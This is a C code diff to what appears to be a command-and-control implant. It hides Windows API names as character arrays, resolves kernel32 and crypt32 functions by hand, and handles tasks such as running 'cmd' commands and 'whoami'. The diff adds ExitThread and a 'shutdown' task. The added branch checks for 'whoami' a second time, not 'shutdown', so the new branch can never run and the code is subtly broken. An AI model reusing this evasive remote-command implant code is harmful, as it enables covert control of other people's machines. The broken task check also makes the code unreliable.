@@ -197,6 +197,7 @@ void myMain()
     CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
     CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
     CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };
+    CHAR exitThread_c[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
 
     // Get Kernel32
     kernel32dll = GetKernel32();
@@ -242,6 +243,7 @@ void myMain()
     api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
     api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
     api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);
+    api->ExitThread = GetSymbolAddress((HANDLE)kernel32dll, exitThread_c);
 
     // crypt32
     api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
@@ -358,6 +360,7 @@ void myMain()
 
         CHAR cmd[] = { 'c', 'm', 'd', 0 };
         CHAR whoami[] = { 'w', 'h', 'o', 'a', 'm', 'i', 0 };
+        CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
         if (my_strcmp(taskType, cmd) == 0)
         {
             orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
@@ -367,6 +370,10 @@ void myMain()
         {
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
             taskOutput = myTrim(orgOutput, '\n');
+        }
+        else if (my_strcmp(taskType, whoami) == 0)
+        {
+            ((EXITTHREAD)api->ExitThread)(0);
         }
         else
         {
